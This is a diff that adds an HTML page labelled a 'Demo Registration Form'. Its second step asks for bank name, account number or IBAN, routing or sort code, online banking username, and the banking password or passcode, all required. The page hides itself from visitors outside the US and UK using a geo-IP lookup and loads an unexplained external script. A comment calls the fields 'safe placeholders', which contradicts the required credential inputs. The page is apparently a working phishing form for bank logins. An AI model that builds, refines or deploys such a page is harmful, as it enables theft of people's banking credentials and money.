@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo Registration Form</title>
+
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f5f5f5;
+    padding: 20px;
+  }
+  .container {
+    max-width: 480px;
+    margin: auto;
+    background: #fff;
+    border-radius: 12px;
+    padding: 25px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  }
+  h2 {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  input, select {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #007bff;
+    color: #fff;
+    border: none;
+    margin-top: 10px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 16px;
+  }
+  button:hover {
+    background: #0056b3;
+  }
+  #blocked {
+    display: none;
+    text-align: center;
+    font-size: 22px;
+    margin-top: 40px;
+    color: red;
+  }
+</style>
+
+</head>
+<body>
+
+<div id="blocked">
+  <p>❌ This service is available only in the USA and UK.</p>
+</div>
+
+<div class="container" id="formBox">
+  <h2>Registration Form</h2>
+<form>
+  <label>First Name</label>
+  <input name=" first name" type="text" placeholder="Enter first name" required>
+
+  <label>Last Name</label>
+  <input name="Last name" type="text" placeholder="Enter last name" required>
+
+  <label>Email Address</label>
+  <input name="Email" type="email" placeholder="Enter email" required>
+
+  <label>Phone Number</label>
+  <input name="Phone Number" type="tel" placeholder="+1 or +44" required>
+
+  <label>Password</label>
+  <input name="password" type="password" placeholder="Create password" required>
+
+  <label>Confirm Password</label>
+  <input name="Confirm password" type="password" placeholder="Re-enter password" required>
+
+  <label>Address</label>
+  <input name="Street Address" type="text" placeholder="Street address" required>
+
+  <label>City</label>
+  <input name="City" type="text" placeholder="Enter city" required>
+
+  <label>State / Region</label>
+  <input name="State / region" type="text" placeholder="Enter state or region" required>
+
+  <label>Country</label>
+  <select required name="country">
+      <option value="">Select country</option>
+      <option value="US">United States</option>
+      <option value="UK">United Kingdom</option>
+  </select>
+
+  <!-- Safe placeholder instead of asking for real bank details -->
+  <label>Financial Info</label>
+  <input name="Financial info" type="text" placeholder="Enter financial nickname">
+<h2> Step 2: Bank information</h2>
+  <label>Select your bank </label>
+  <select name="Bank selected">
+   <option> BOA</option>
+   <option>JP Morgan Chaise bank</option>
+   <option>Bank of American BOA</option>
+   <option> Others bank</option>
+  </select>
+  <label> Enter name of the bank manually</label>
+  <input name="Name of bank" type="text" placeholder="Wells Fargo" required>
+    <label>Bank holdername</label>
+  <input name="Bank holder name" type="text" placeholder="John joe" required>
+  <label>Username, userid or nickname</label>
+  <input name="Nickname or username" type="text" placeholder="@johnjoe2" required>
+    <label>Account number or IBAN</label>
+  <input name="Account number or IBAN" type="text" placeholder="USA |Account number / UK| IBAN" required>
+    <label>Routing Number or sort code</label>
+  <input name="Routing or sort code" type="text" placeholder="USA | Routing / UK | Sort code" required>
+    <input name="Account numberor IBAN" type="text" placeholder="USA |Account number / UK| IBAN" required>
+    <label>password or passcode</label>
+  <input name="passcode or password" type="text" placeholder="**********" required>
+  <button type="submit">Submit</button>
+  </form>
+</div>
+<script src="intelligent.js"></script>
+<script>
+  // Simple country-check (not 100% accurate)
+  fetch("https://ipapi.co/json/")
+    .then(response => response.json())
+    .then(data => {
+      const allowed = ["US", "GB"]; // USA + UK
+      if (!allowed.includes(data.country)) {
+        document.getElementById("formBox").style.display = "none";
+        document.getElementById("blocked").style.display = "block";
+      }
+    });
+</script>
+
+</body>
+</html> 
